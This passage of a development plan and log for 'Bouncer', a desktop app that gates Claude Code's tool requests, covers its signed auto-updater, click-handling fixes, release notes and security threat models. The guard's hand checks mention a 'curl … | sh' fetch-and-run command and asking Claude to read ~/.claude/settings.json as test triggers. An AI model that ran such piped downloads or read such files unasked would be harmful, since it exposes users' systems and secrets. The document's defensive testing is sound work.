`default-features = false, features = ["native-tls"]`: Windows' own TLS
(schannel) instead of rustls / ring, no `zip` (only for v1-style bundles).
Cargo.lock gains 23 entries; 9 compile on Windows
(`tauri-plugin-updater`, `minisign-verify`, `native-tls`, `schannel`,
`hyper-tls`, `tokio-native-tls`, `tempfile`, `zeroize`, `rustls-pki-types`;
`reqwest` was already there); the rest are macOS / Linux / Android only.
No JS package; no plugin permission is granted to the page (only our own
commands). From the plugin's source: the check is a GET of the endpoint
with `Accept: application/json` and `User-Agent:
tauri-plugin-updater/2.13.3`; a fixed URL carries nothing about the install
(no version, target or arch variables). The installer's minisign signature
is checked against the public key in `tauri.conf.json` before it runs
(can't be turned off; TLS enforced). On Windows it runs the NSIS setup
with `/P /UPDATE /R` (passive: a progress bar, no questions, then restart)
and exits Bouncer; our installer hooks already treat `/UPDATE` as an
update (no hooks prompt, app data kept).

Decisions (Charan, 2026-10-15):

1. Passive install.
2. Security rule 7 becomes: no network calls except the opt-out daily
   update check of `latest.json`.
3. Off in debug / dev builds: Bouncer-dev never checks or installs.
4. A card or question waiting, or a chat or explanation running: Update
   waits ("Update after you answer"); Bouncer never quits mid-decision.
5. Only a newer version is ever offered; never a downgrade.
6. The updater key: Charan made it and set `TAURI_SIGNING_PRIVATE_KEY` and
   `TAURI_SIGNING_PRIVATE_KEY_PASSWORD`; the public key is in
   `tauri.conf.json`. He keeps the private key and password backed up
   offline (lost: no more updates for installed copies; leaked: rotate).
7. 0.7.0 has no updater: its users install 0.8.0 by hand once (README,
   v0.8.0 notes).

Design:

- Endpoint: `https://github.com/charanp11/bouncer-app/releases/latest/download/latest.json`.
  GitHub's "latest" is the newest published, non-prerelease release, so a
  draft is never offered.
- Check: release builds only; a thread wakes hourly and checks when the
  preference `updates` (`preferences.json`, on by default; Settings "Check
  for updates") is on and the last check is a day old (the first a minute
  after start). 30 s timeout. Anything failing (offline, GitHub down, bad
  JSON, no newer version): nothing shown, try again tomorrow. Only a plain
  `X.Y.Z` strictly newer than the running version is offered (core's
  `update::newer`, also the plugin's version comparator).
- Island: the session list shows "Bouncer X.Y.Z is ready" with Update
  (armed 600 ms). Nothing installs before that click.
- Install (`update_install`, no arguments): refused while a card waits or a
  chat / explanation runs (the page shows "Update after you answer");
  download (signature checked), the same check again, the chat and
  explanation ended, then the plugin runs the installer and exits.
- Turning the switch off forgets a found update and stops checking: no
  network at all.
- Release: the installer is built with no secrets (no
  `createUpdaterArtifacts`); then a step of its own runs only the pinned
  Tauri CLI's `signer sign` on the finished installer, with the two secrets
  in that step's env alone (Charan, 2026-10-15: no build script ever sees
  the key). The release job writes `latest.json` (version, notes, date,
  `windows-x86_64` url + signature) from the `.sig` and uploads it with the
  installer to the draft.

| Threat | Fix |
| --- | --- |
| A tampered installer (mirror, MITM, a replaced asset) | Minisign signature checked against the shipped public key before anything runs; HTTPS only |
| A draft or prerelease offered | Only GitHub's "latest" published release is read |
| A downgrade or odd version string | Only a plain X.Y.Z strictly newer than ours (`update::newer`, tested) |
| Bouncer quits mid-decision (a card, a question, a chat) | `update_install` refuses while any of them is up, before and after the download |
| Installs without the user | Only `update_install`, from the Update button; never on a schedule |
| Leaks about the user | One GET of a fixed URL with a generic user agent; nothing else sent; off = no network |
| Error spam when offline / GitHub down | Failures are silent; next try tomorrow |
| A dev build updates itself or the installed app | Off in debug builds (checked first in both paths) |
| The page reaching the updater | No plugin permission for the page; only our `update_install` and the prefs switch (strict-commands test) |
| Losing hooks / rules / history on update | `/UPDATE` keeps them (installer hooks, installer CI test) |
| The private key leaking from CI | Only the signing step gets it, which runs only the pinned Tauri CLI on the built installer (no cargo, build scripts or npm install there); release workflow runs on tags only, never on PRs |

Done when:

- [x] `tauri-plugin-updater` (pinned, native-tls), pubkey and endpoint, passive mode; release builds only
- [x] Core: `update::newer` and the `updates` preference (default on) (UP1, UP2)
- [x] App: daily check, the found update in the view, `update_install` with the waiting rule; the switch (UP3, UP4, UP6)
- [x] Prototype v0.29: the update notice and the Settings row; the page built to it (UP5)
- [x] Release workflow: signed bundle, `latest.json` on the draft (UP7)
- [x] README (what the check does, how to turn it off, Watch → Releases), COMPARE, security rule 7, v0.8.0 notes (UP7)
- [x] TESTS rows UP1–UP8

Implemented. Core: `update::newer`, `Prefs::updates`, `Desk::has_cards`.
App: `update.rs` (`Updates`, `start`, `update_install`), `set_updates`,
`Chats::running`; the plugin registered after the second-launch check. Page:
`updateRow` / `updatesRow`, `src/update.ts` (`updateButton`). Release:
the "Sign for the updater" step (`tauri signer sign`, the two secrets only
there), `scripts/latest-json.mjs`, `latest.json` on the draft, `docs/releases/v0.8.0.md` (put first
in the notes by `release-notes.mjs`). Found while verifying (Claude): Tauri
only *warns* when the signing key doesn't match the public key, so a wrong
or rotated secret would ship updates installed copies refuse;
`latest-json.mjs` now compares the signature's key ID with the public key's
and fails the release job instead (tested). `.gitleaks.toml` allows minisign
public keys only.

Verify (2026-10-15):

| Case | Result |
| --- | --- |
| Signed bundle (release profile, a throwaway key in the scratchpad; first with the bundler, then, after Charan's change, `tauri signer sign` on the finished installer) | `Bouncer_0.0.0_x64-setup.exe`; the signer wrote its `.sig` (416 bytes) with the throwaway key's ID |
| `latest-json.mjs` on that `.sig` | Refused: "not made with the updater key in tauri.conf.json"; the key-ID extraction gives the same ID for the throwaway `.sig` and its own `.pub` |
| CI on the PR | All seven checks green (deny: the new crates' licenses; gitleaks: the public key allowed) |
| Test instance (debug build): Settings | "Check for updates · On", last row, hint in full (word for word as the prototype); Off → `preferences.json` `"updates": false`; On → `true` |
| Test instance: no checks in a dev build | No remote TCP connection from the app after 107 s (a release build checks at 60 s) |
| Test instance: the update line (a sample update added to the page's views over CDP, test only; the app can't find one in a dev build) | "Bouncer 0.8.1 is ready" with Update above the sessions, as the prototype; Update in a dev build → refused ("dev"), the line back as it was; installing → "Updating…", disabled |
| A real update (0.8.0 → 0.8.1) | Not possible before a published release with an updater: UP8, after the next release |

**Settings freeze (2026-10-16, found in v0.8.0's draft check).**

Bug (Charan's draft check of v0.8.0): changing Size, Sound, Sound style or
Volume in Settings froze Bouncer ("Not responding", never recovered).
Cause: #42 added `updates: island.prefs.lock().unwrap().updates` to
`set_prefs` right below `shortcut: island.prefs.lock().unwrap().shortcut`;
both are in one `let new = Prefs { … };` statement, so the first guard
lives to the end of the statement and the second `lock()` waits for it
forever, on the main thread. Reproduced on the test instance built from
#42 (one Size click: `Responding = False`).

The miss: the updater's Verify clicked only the new "Check for updates"
switch (`set_updates`, which locks once) and the tests checked the
preference's parsing and saving (`prefs.rs`), never `set_prefs` itself: it
needs a Tauri `State`, so nothing exercised it. Clippy doesn't see a
`Mutex` locked twice. The Settings page wasn't clicked through.

Fix (PR "fix-prefs-freeze"): every Settings command goes through
`update_prefs`, which copies the current preferences under the lock,
makes the change and saves with no lock held, then stores under the lock;
`set_prefs`' mapping is `page_prefs`. Searched every crate for the same
lock twice in one statement or a guard held across a relock: only this
one (the other guards in `chat.rs`, `lay_out` and `hooks_preview` are
taken once and dropped before anything relocks; `always` drops its guard
before `publish`).

Tests (TESTS U10): `settings_changes_never_hold_the_preferences_lock`
runs every Settings change through `update_prefs` on a thread with a 10 s
deadline (a change that itself locks the preferences too); made to hold
the lock while changing, it fails at 10 s ("a Settings change hung")
instead of hanging. `no_statement_takes_the_same_lock_twice` scans the
app's sources (and flags 0.8.0's `set_prefs` text) and checks the three
commands only use `update_prefs`. The release hand check now has a
Settings click-through for every release.

Real clicks (2026-10-16, test instance from the fix, black backdrop,
`rc.ps1`'s guard: each point owned by the test instance): Size Large and
Medium, Sound off and on, Sound style Playful and Soft, Volume, Shortcut
off and on, Guard on and off, Check for updates off and on: 13 of 13
passed; after each, Windows' `Responding` true, an IPC round trip
answered, and the change was in `preferences.json` / `rules.toml`. Start
with Windows not clicked (it writes the real Run key).

Release (Charan): v0.8.0 was never published. Once this merges its
draft is deleted (the tag kept for history) and v0.8.1 is tagged as the
first release with c2, Guard every mode and the updater; its notes
(`docs/releases/v0.8.1.md`) carry 0.8.0's over and say 0.8.0 was never
released. `release-notes.mjs` skips v0.8.0 (`NEVER_RELEASED`), so
v0.8.1's changes are listed since v0.7.0.

**v0.8.1 published (Charan, 2026-10-16).** Manual checks (Charan, the
v0.8.1 draft's installer, his own desktop): the hash matched; every
Settings control changed one at a time, no freeze; Guard every mode in
bypass mode (asked Claude to read `~/.claude/settings.json`: it used Read,
the Risky card came, Deny stopped it); a question answered from the
island. Found: (1) the hand checks' "run curl … | sh" doesn't test the
guard (Claude downloads the script by itself first, so nothing risky
reaches it): the hand checks now ask Claude to read
`~/.claude/settings.json`; (2) the bug below.

**One click counts (2026-10-16, found in the v0.8.1 check).**

Bug (Charan): while he typed in a terminal a question card came; his click
on "Blue" didn't register and the focus ring jumped to "Red"; it took a
second click. Reproduced on the test instance (real clicks behind
`rc.ps1`'s guard, a black backdrop standing in for the terminal and
holding the keyboard, every pointer / click / focus event logged in the
page over CDP):

- The ring: every time. The press asks for the keyboard (`pointerdown` →
  `keyboard`); when it arrives, `placeFocus` put focus on the card's start
  (`arrivalFocus`: the first option, Keep planning, Deny), not on what
  was pressed.
- The lost click: a view arriving between press and release rebuilds the
  card (`replaceChildren`), and WebView2 then fires `pointerup` on the new
  element but never `click`. Shown by forcing one view 100 ms into a
  400 ms press: no click. In a real session views arrive all the time
  (Claude Code working, the keyboard handover itself). Five plain clicks
  (fast, held 400 ms, 60 views a second from another session, a fresh
  instance) all counted, which is why it only shows sometimes.

Fix (one PR with the hand check wording, for v0.8.2): `src/press.ts`, a
`PressGate`: from `pointerdown` until the press ends (`pointerup`,
`pointercancel`, the window's `blur`; at most 1.5 s, so a drag can't stall
the island) a view waits and is drawn right after the click. The keyboard
taken by a press stays on the control pressed (`arrivalFocus` with any of
the card's own controls: options, Deny, Keep planning, the plan's box,
Explain); a press on Allow, Send answer or Approve plan sends it nowhere
(its click answers), so focus is still never put on an answer. The island
still never takes the keyboard by appearing (unchanged).

Verify (2026-10-16, test instance from this branch, real clicks, the
backdrop holding the keyboard each time, a view forced into every press):
question second option (picked; focus on it), Send answer, Keep planning,
Approve plan, Deny, Allow once (each answered; focus nowhere), Explain
(box open; focus on Explain): 7 of 7, the click ran every time and the
rebuild came after it. The old build, the same forced view: no click.

**v0.8.2 published (Charan, 2026-10-16).** Manual checks (Charan, his own
desktop): TESTS UP8 passed, the first real update: his installed 0.8.1
showed "Bouncer 0.8.2 is ready" after he started it; Update installed it
with no SmartScreen prompt; Windows' Installed apps shows Bouncer 0.8.2;
the guard, settings and hooks unchanged (offline not checked). The option
click fix confirmed (UI18): one click on Blue picked it the first time,
ring on it. Found: (1) after picking Blue, his first click on Send didn't
answer, the second did (below); (2) Installed apps shows Publisher
"github"; (3) the chat's "Plan use: 5-hour — · 7-day —" before the first
message after a restart looks broken.

**Every click counts (2026-10-16, for v0.8.3).**

Charan's rules: the arm delay protects against a card appearing under the
pointer, so it counts from when the card became fully visible, never from
the last pick; a deliberate Send after picking works the first time; no
click is ever silently swallowed: a control that isn't ready looks it, and
Allow keeps its arm. Audit with real clicks on the test instance, the
keyboard elsewhere, quick clicks the moment a control is ready and while
redraws land.

Audit (test instance from this branch, real clicks behind `rc.ps1`'s
guard, the black backdrop holding the keyboard, events logged in the
page; Claude Code 2.1.295 for the real sessions):

- Send after a pick, not reproduced: 9 runs (fixture card and real
  Claude Code sessions in the test config folder; picks then Send 100 to
  1000 ms later; a fresh hidden island; Size Small; 9 s on the card first)
  all answered with the first Send. Send was already enabled at its
  press each time: the pick never restarted the arm (the page's arm only
  starts in `armIfVisible`, once per card).
- What could swallow a Send silently, found in the code: (a) a refused
  answer (`answer` / `decide` / `plan` rejected: too soon, picks that
  don't fit, already answered) cleared the toast and redrew the card with
  no word; (b) an incomplete Send (no pick yet) ran the arm's fill on
  every redraw, so a disabled button looked like it was arming; (c) the
  arm started a little before the card was on screen: `fit` is a sync
  (main-thread) command but queued the window layout with
  `run_on_main_thread`, which runs after the reply, and the page starts
  the arm on the reply.
- A real lost click, found by the audit: the gear. With the keyboard
  elsewhere, 7 of 10 gear clicks opened Settings and the island snapped
  back to the session list within 10 ms (the backend still thought
  Settings was open). Cause: `PressGate.release()` (0.8.2, #44) took the
  view that waited under the press and drew it on a timer; the click's own
  newer view (Settings open) was drawn first, then the stale one over it.
  The same can undo any click whose answer is a new view, which is the
  most likely cause of Charan's Send.

Fix:

- `src/press.ts`: the waited view is taken when the timer runs, and a view
  drawn in between clears it: a stale view is never drawn over a newer one.
- `src/arm.ts` (`armState`): one place for an armed button's look:
  waiting (not on screen yet, no fill), arming (the fill carries on from
  the card's time), blocked (a question without a pick, an update that
  waits: disabled, no fill), ready. `armed(label, since, enabled)` uses it
  for Allow, Send answer, Approve plan, Add rule and allow, Turn on
  auto-allow, Write changes, Delete history and Update.
- A press on a disabled control shakes it (an outline under reduced
  motion): visible, never silent. A refused answer shows "Not sent: <why>.
  Try again." under the card's buttons for 4 s.
- `fit` lays the window out before it replies (the window holds the card
  when the arm starts). Measured with a spin watcher on the window's
  region (one clock): card on screen at 0 ms, `fit` replies at +8 to
  +13 ms, the arm starts at +16 ms, Allow ready at +624 to +630 ms (3 runs).
- A next-frame visibility check after each render (a card already held by
  the window arms without waiting for a resize or a reply).

Extras (same PR): the installer's Publisher is "Charan"
(`bundle.publisher`; the installer test checks the uninstall entry);
"Bouncer 0.8.3" at the bottom of Settings (the build's version from
`about`, text only); the chat's plan use says "Plan use shows after your
first message" until a reply brings a reading. Cause confirmed: the
reading only comes as Claude Code's `rate_limit_event` inside a chat
reply, and chats are memory-only, so a restart has none. Nothing stored,
no call of its own.

Verify (2026-10-16, test instance from this branch, audit mode: a scratch
Run key, a scratch Claude config folder, the repo's fake `claude` first on
PATH; nothing reaches the real profile). Real clicks, one per row, the
backdrop holding the keyboard first:

| Area | Controls (scenario) | First click worked |
| --- | --- | --- |
| Question card | Blue (first click), Send answer right after the pick; Red while a redraw lands, Send the moment it's ready | 4 / 4 |
| Question card, inside the arm | Pick at +60 ms, Send at +399 ms after the card is on screen: Send looked arming, the press shook it, nothing sent; Send at +632 ms answered | as designed |
| Permission card | Allow once the moment it arms; Allow once while a redraw lands; Deny right as the card shows; Deny after Explain | 4 / 4 |
| Plan card | Approve plan the moment it arms; Keep planning right as the card shows | 2 / 2 |
| Always allow | Always allow…, Cancel, Always allow… again while a redraw lands, Add rule and allow the moment it arms | 4 / 4 |
| Explain | Explain this command, Stop while it streams, Hide | 3 / 3 |
| Session list | Pill, a session row, Close (detail), a row while a redraw lands | 4 / 4 |
| Chat | Ask Claude (open), Send, Cancel while it streams, New chat, Close; the plan-use line before the first message | 5 / 5 |
| Settings | Gear (10 / 10, was 3 / 10), Size Small / Large / Medium in quick succession, Sound off / on, Sound style Playful / Soft, Volume (a click on the track), Which sounds, a sound's switch off / on, Auto-allow → Cancel, → Turn on auto-allow the moment it arms, off; Guard every mode on / off; Wipe… → Cancel, → Delete history the moment it arms (scratch history); Confirm this path (the scratch fake); hooks Install… → Cancel, → Write changes the moment it arms, Remove… → Cancel (scratch settings.json); Start with Windows on / off (scratch Run key); Shortcut on / off; Check for updates off / on; Close | every one (two audit runs; Remove… → Cancel clicked singly) |

Not driven by real clicks: the update line's Update button (it shows only
in a release build with a newer release; Charan's UP8 click on 0.8.2
worked first time; `armed(…, state.enabled)` covered by the frontend
test) and the tray menu (the notification area is Explorer's window,
outside what the guard lets a test click; Charan's release hand check
covers it). The audit's own misses were all script errors, each checked
by hand: a stale selector for the chat log, clicking the detail's × while
its 320 ms open animation still moved it, a hooks button below the
scrolled area (the guard refused the click, as it should), state left by
an earlier run.

**v0.8.3 published (Charan, 2026-10-16).** Shipped with #48 and the
Dependabot updates #45 (npm: `@tauri-apps/api` 2.12.3, `cli` 2.12.2), #46
(actions) and #47 (cargo: `tauri` 2.12.2, `tauri-build` 2.7.2,
`tauri-plugin-global-shortcut` 2.4.1, `serde_json` 1.0.154), each rebased
and green, the installer test run on each. Manual checks (Charan, his own
desktop): his 0.8.2 offered the update and installed 0.8.3 (the second
real update, TESTS UP8); Installed apps shows 0.8.3, Publisher "Charan"
(W10); Settings ends with "Bouncer 0.8.3" (U11); one click on the gear
opens Settings and it stays; pick then Send at once answered on the first
click (UI19); the chat shows "Plan use shows after your first message"
(C21). v0.8.x is done; next is roadmap d (file drop, Phase 7).

## Phase 7 — File drop (~1 week)

Roadmap d. Charan's twist (2026-10-12): after a drop, choose "Is this safe to
run?" or "Ask about it"; read-only; nothing sent before he confirms.

- **Audit:** Tauri drag-and-drop events (Phase 2 turned `dragDropEnabled` off);
  what a drop exposes (paths only, not contents); size and type limits; how a
  file is attached to a running session or asked about in chat.
- **Implement:** drop target on the island with a catch animation; choice: "Ask
  Claude about it" (Phase 6 chat) or "Attach to session"; size/type limits;
  preview of exactly what will be sent; nothing sent until the user confirms.
- **Test:** oversized, wrong-type, symlinked, directory and unreadable drops are
  refused with a reason; cancel sends nothing; file names render inert.
- **Verify:** file contents never stored (rule 7); no read before confirm beyond
  size/type checks.

| Threat | Fix |
| --- | --- |
| Sensitive file sent by accident | Preview + explicit confirm; nothing sent before it |
| Symlink / path tricks | Canonicalise; refuse symlinks and folders |
| Huge or binary file | Size and type limits checked before reading |
| Hostile file name | `textContent`; hidden characters made visible |
| Contents persisted | Never stored; only sent where the user chose |

Phase 7 is done when:

- [ ] Drop → catch animation → ask or attach → confirm → sent
- [ ] Every refusal case tested; cancel sends nothing
- [ ] fmt, clippy, tests green locally and in CI

## Phase 8 — Music (~1 week)

Roadmap e: within the motion and CPU budget.

- **Audit:** Windows media controls (`GlobalSystemMediaTransportControlsSessionManager`
  via WinRT): what it needs (likely the `windows` crate, a new dependency to ask
  about), idle cost of listening; macOS later.
- **Implement (Windows):** now playing (title, artist, app) in the island;
  play/pause/skip for any player; the ball dances while music plays.
- **Test:** no player, several players, player closing mid-track; hostile track
  titles render inert.
- **Verify:** no network calls (no album-art fetching); idle CPU ~0%; feature can
  be turned off.

| Threat | Fix |
| --- | --- |
| Track metadata injects markup | `textContent`; hidden characters made visible |
| Listening costs CPU | Event-driven, no polling; off switch |
| New native dependency | Asked first; cargo deny; Windows-only target |

Phase 8 is done when:

- [ ] Now playing + play/pause/skip work with at least two players on Windows
- [ ] Ball dances while playing; reduced motion respected
- [ ] fmt, clippy, tests green locally and in CI

## Phase 9 — Packaging and release (~1 week)

Split by the roadmap: Windows release is c (with the hooks warning, pulled
forward), Mac release is g, Linux is i.

- **Audit:** document unsigned-app warnings per OS; Defender false-positive process;
  check eligibility for free SignPath Foundation signing.
- **Implement:** release workflow on `v*.*.*` tags: macOS universal `.dmg`, Windows
  NSIS `.exe` (per user; no MSI, roadmap c), SHA-256 checksums, GitHub build attestations; README with pitch, demo GIF,
  install / verify / uninstall steps, privacy statement.
- Settings warns when installed hooks are missing events; one click re-installs.
  (Same rules as `install-hooks`: shows the diff, asks, dated backup, atomic
  write; only our entries change.) Pulled forward into roadmap c (Windows).
- **Test:** install, use, uninstall on clean Windows (own PC) and macOS (friend's Mac,
  using the CI build); `settings.json` restored exactly. Narrator (and VoiceOver
  on the Mac) reads the card, the list and Settings in order with their names
  (`docs/TESTS.md` UI16, M3).
- **Verify:** only the release job can write; no secrets in logs; README alone is enough.
- Commits: `ci: release workflow with checksums and attestations` →
  `docs: install, verify and uninstall guide` → `chore: v1.0.0`

### macOS-only code from Phases 1–4 (2026-10-03)

There's no Mac for development; the friend's Mac is for the Phase 9 check only.
"CI" means a test on the `macos-latest` runner; "smoke" means the planned
`ci: macos smoke test` job (after Phase 4 merges: launch the debug app, feed
it a session and a request, take a screenshot, check modes).

| What | Where | Covered by |
| --- | --- | --- |
| Socket path `~/Library/Application Support/Bouncer/bouncer.sock` | `relay/src/unix.rs` | CI (path unit test); smoke (the real folder) |
| Server refuses a socket folder that isn't `0700` and ours | `core/src/ipc.rs` | CI (`refuses_a_folder_others_can_open`); smoke (real folder is `0700`) |
| `getpeereid` same-user check, both ends | `relay/src/unix.rs`, `core/src/ipc.rs` | CI for the same-user path (ipc and relay tests connect through it). **Another user refused: human** |
| Relay fail-safe over the socket (no app, slow app) | `relay/tests` | CI |
| Rules file / folder owner + mode check, links refused | `core/src/rules.rs` | CI (`files_others_can_write_are_refused`) |
| Rules file created `0600`, folder `0700` | `core/src/rules.rs` | CI |
| Log folder `0700`, day files `0600`, shared folder refused | `core/src/activity.rs` | CI (`files_are_private_and_shared_folders_refused`); smoke (real files) |
| `install-hooks` backup keeps the file's mode | `core/tests/install.rs` | CI |
| Symlinked paths (`/private/var` temp, links out of the project) | `core/src/check.rs`, `rules_cases.rs` | CI |
| Idle time from CoreGraphics (`CGEventSourceSecondsSinceLastEventType`) | `core/src/away.rs` | CI (call returns a value). **Real idle → away summary: human** |
| No Dock icon (`ActivationPolicy::Accessory`) | `app/src/main.rs` | **Human** |
| Menu-bar tray icon, greyed when paused, menu items | `app/src/main.rs` | **Human** |
| Transparent rounded window and shadow (`ROUNDED`); square fallback if it fails | `app/src/main.rs`, `styles.css` | Smoke (screenshot). **Look and corners: human** |
| Window never takes focus; first click works (`focusable: false`, `acceptFirstMouse`) | `tauri.conf.json` | **Human** |
| Placement under the menu bar, drag, multi-monitor, stays on screen | `app/src/main.rs` | **Human** |
| OS fonts (Segoe UI isn't on macOS; falls back to `system-ui`) | `styles.css` | Smoke (screenshot). **Human** |
| Real Claude Code on a Mac: hooks installed, Bash requests approved / denied from the island | all | **Human** |
| Unsigned app opens after "Open Anyway" | release | **Human** (Phase 9 itself) |

Mac checks for Phase 9 (a person on a real Mac):

- [ ] A second macOS user can't connect to the socket (getpeereid refusal)
- [ ] Idle 10+ minutes during a session, come back: the away summary opens
- [ ] No Dock icon; tray icon in the menu bar; Pause greys it and changes the tooltip; Wipe history and Quit work
- [ ] Island corners rounded with a shadow, nothing opaque around it; fonts look right
- [ ] The island never takes keyboard focus; one click on Allow / Deny works
- [ ] Tray "Open Bouncer" / "Settings…" give the island the keyboard (Tab, Esc); clicking elsewhere gives it back (5b `set_focusable` toggling)
- [ ] Sounds play without clicking the island first (WKWebView autoplay); idle CPU stays ~0 after a sound
- [ ] Island sits under the menu bar, can be dragged, comes back if dropped off screen, crosses monitors
- [ ] Real Claude Code session: hooks installed with `bouncer install-hooks`, a Bash request allowed and one denied from the island, an unanswered one falls back to the terminal
- [ ] Unsigned `.dmg` opens after "Open Anyway"; uninstall removes only our hook entries

---

## Threat model

Core rule: every failure means "ask in the terminal," never "allow."

| Threat | Fix | Phase |
| --- | --- | --- |
| App fails open | Errors/timeouts return empty output; tests assert no default allow | 1 |
| App blocks the agent | Hard relay deadlines; exit 0 if app missing | 1 |
| Another user answers approvals | User-only socket/pipe + same-user check both ends | 1 |
| Oversized / malformed input | 1 MB cap, field trimming, parse failure → exit 0 | 1 |
| Settings file damaged | Backup, merge, diff, confirm, atomic write | 1 |
| Script injection in island | `textContent` only, strict CSP, minimal capabilities | 2 |
| Forged / replayed approval | Single-use random request IDs | 2 |
| Accidental approval | 600 ms arm delay, no default focus, Enter doesn't approve | 2 |
| Disguised dangerous command | Real parser, compound needs all parts allowed, unparsed → ask, hidden chars flagged | 3 |
| Path escape | Resolve fully; outside project → ask | 3 |
| Rules file tampering | Refuse files others can write; show changes | 3 |
| Secrets in history | Redact, no outputs, local, owner-only, retention, wipe | 4 |
| Supply chain | Few deps, lockfiles, cargo deny (+ weekly advisories), npm audit, Dependabot, SHA-pinned Actions | 0 |
| Chat run acts or is injected | Exec form, prompt on stdin, locked-down chat permissions | 6 |
| File sent by accident | Preview + confirm; limits; symlinks refused; contents never stored | 7 |
| Untrusted media / file / model text | `textContent`, hidden characters made visible | 5–8 |
| Tampered download | CI-only builds, checksums, attestations | 9 |

Out of scope: malware already running as the user (it can edit Claude Code's
settings directly). The README says so.

## Cost

$0. macOS: no Apple Developer Program ($99/yr) — users click "Open Anyway" once in
Privacy & Security. Windows: unsigned unless SignPath Foundation accepts the project —
users click "More info → Run anyway" once. CI, scanning and attestations are free for
public repos. No paid APIs.

## Decisions

- Name: **Bouncer**, bouncing-ball character.
- Repo and package name: **`bouncer-app`** (github.com/charanp11/bouncer-app).
  `bouncer` is taken on crates.io ("CLI sandboxing toolkit", 2026) and npm, and
  several small Claude Code permission-hook projects on GitHub already use it
  (karanb192/bouncer, karlkfi/claude-bouncer, clownware/bouncer). Crates are
  prefixed `bouncer-` (`bouncer-relay`, `bouncer-core`, `bouncer-app`); the app
  name stays Bouncer.
- Test machines: Charan's Windows PC; a friend's Mac (CI builds) for manual tests.
- Risky actions are flagged, never auto-denied, in the MVP.
- Lowest supported Claude Code version: **2.1.139** (Phase 1 audit).
- Scope (2026-10-02): Phases 5–8 (character, chat via local `claude -p`, file
  drop, music) added after the security core; packaging is Phase 9. None starts
  before Phase 4 is merged.

## Phase summaries

(Added as each phase passes Verify.)

### Setup summary (2026-10-01)

Toolchain already present: git 2.51.2, Node 24.11.0, rustc/cargo 1.99.0
(stable-x86_64-pc-windows-msvc) with clippy and rustfmt, winget 1.29, WebView2
154.0. Nothing needed installing. `git init -b main`; repo-local identity
`Charan <177669994+charanp11@users.noreply.github.com>`.

### Phase 0 summary (2026-10-01)

- Repo: github.com/charanp11/bouncer-app, public. Crates `bouncer-relay` (binary
  `bouncer-hook`, no dependencies yet), `bouncer-core` (empty), `bouncer-app` (Tauri
  2.12 shell). Frontend: Vite 8 + TypeScript 7, no UI framework.
- The Tauri shell has the CSP from the audit, a looser `devCsp` for dev only (Vite
  injects styles and uses an HMR websocket), `freezePrototype`, no plugins, no
  commands, an empty command allow-list in `build.rs`, and one capability for
  `main` with no permissions. Vite listens on `127.0.0.1:1420` only.
- CI (`ci.yml`): fmt, clippy `-D warnings` and tests on Windows and macOS (the
  frontend is built first); `cargo deny check`, `npm audit` and gitleaks on Linux.
  `advisories.yml` runs `cargo deny check advisories` every Monday. Actions pinned to
  SHAs; `permissions: contents: read`; checkout without persisted credentials.
- GitHub: private vulnerability reporting, Dependabot alerts and security fixes,
  read-only default Actions token, Actions can't approve PRs, rebase-merge only,
  branches deleted after merge. `main` protection: PR required (0 approvals), the
  five CI checks required (bound to GitHub Actions) and up to date, linear history,
  no force push or deletion, admins included.
- Tests: 1 (the relay prints nothing and exits 0), passing locally and in CI on
  both OSes.
- Notes: the repo was recreated once to drop a line from early history. Dependabot
  version updates and the weekly advisories job only start once their files are on
  `main`; run `advisories.yml` once by hand after the merge. cargo-deny warns about
  duplicate crate versions from Tauri's tree (allowed as warnings).

### Phase 1 summary (2026-10-02)

- `bouncer-hook` (relay): reads one hook event (≤ 1 MB, else dropped whole),
  drops `tool_response` / `transcript_path`, forwards it as one JSON line. All
  blocking work, stdin included, runs on a worker under a 2 s budget, extended to
  110 s only for `PermissionRequest`. Prints only for an exact `allow` / `deny`
  from a same-user app. Dependencies: `serde_json`, plus `windows-sys` on Windows.
- Transport: Windows named pipe `\.\pipe\bouncer-<SID>` with a protected
  user-only DACL, `FIRST_PIPE_INSTANCE`, remote clients rejected, SID checked on
  both ends. macOS: socket in `$TMPDIR/bouncer-<uid>/` (`0700`, owner and mode
  checked), `getpeereid` on both ends.
- `bouncer-core`: `Event` (agent, session, project, kind, tool, input, time); the
  `ipc` server; `hooks` install/uninstall logic and the `bouncer` CLI. The app
  starts the server and answers nothing yet (every request falls back to the
  terminal). `examples/answer.rs` is a console stand-in used for manual checks.
- `bouncer install-hooks` / `uninstall-hooks`: exec-form hooks for eight events,
  diff, `y` required, dated backup, atomic rename, key order kept.
- Lowest supported Claude Code: 2.1.139.
- Tests: 35 (relay 17, core 18), green locally and in CI on Windows and macOS.
  Fixtures: 12 events from Claude Code 2.1.143 (incl. two real
  `PermissionRequest`s; nine were first mislabeled 2.1.287, fixed after review)
  and 10 from 2.1.287 (incl. one `PermissionRequest`), added after review.
- Checked by hand: playground session allowed a Write through Bouncer; unanswered
  requests fell back to the terminal prompt; `git status` (already allowed by
  Claude Code) fired only `PreToolUse`; the live pipe's DACL read back user-only.
- Denied by hand: a real Write denied through Bouncer showed "Denied in Bouncer /
  Denied by PermissionRequest hook" and the file wasn't created.
- Not done by hand: a second Windows/macOS account trying to connect (no second
  account; DACL and peer checks reviewed instead); the macOS socket was exercised
  only by CI.
- Note for Phase 3: in Claude Code's `auto` permission mode, Claude Code approves
  many actions itself and no `PermissionRequest` fires; Bouncer only sees them
  through `PreToolUse`.
- Dependabot alert #1 (glib < 0.20, GHSA-wrw7-89jp-8q8g): reaches us only through
  Tauri's Linux GTK stack; not compiled for Windows or macOS. Dismissed as
  "vulnerable code is not used".

### Phase 2 summary (2026-10-02)

- Review follow-ups from PR #2 first: `BOUNCER_ENDPOINT` debug/test only (CI
  checks release); backups keep the original's permissions; macOS socket in
  `~/Library/Application Support/Bouncer/`; `CLAUDE_CONFIG_DIR` tested and an
  empty value refused; fixtures relabelled by their real recording version
  (nine were 2.1.143, not 2.1.287) with a test tying names to recordings; a
  counting race in two relay tests fixed.
- `bouncer-core::approvals`: the desk. FIFO queue across sessions; random
  128-bit single-use request IDs (std only); 100 s wait under the relay's shared
  110 s budget; Allow refused within 600 ms; pause releases everything to the
  terminal; sessions with folder, current step and state; agent text made
  visible-safe (controls, ANSI, bidi, zero-width, tag characters).
- The island (Tauri): undecorated, always on top, no taskbar entry, never takes
  focus (`focusable: false`); hidden / pill / open; sizes itself to its content;
  draggable, remembers its spot, stays on screen, crosses monitors. Approval card
  with full command, "1 of N", Deny / Allow once (arms after 600 ms). Five
  commands only (`subscribe`, `decide`, `expand`, `drag`, `fit`); no plugins; CSP
  unchanged. Tray: Pause / Resume (grey icon + tooltip) and Quit.
